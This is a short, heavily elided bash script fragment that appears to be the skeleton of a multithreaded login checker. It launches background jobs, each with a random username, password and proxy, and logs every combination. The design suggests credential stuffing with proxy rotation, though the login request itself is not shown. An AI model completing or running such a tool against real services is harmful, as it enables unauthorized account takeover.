...
echo "Starting multithreaded script..." | tee -a "$log"
...
# Read max threads from the configuration file
...
while true; do
    if [[ $thread_count -lt $max_threads ]]; then
        ...
        echo "Starting thread: $thread_count, User: $random_user, Pass: $random_pass, Proxy: $random_proxy" | tee -a "$log"

        # Execute login check in background
        (
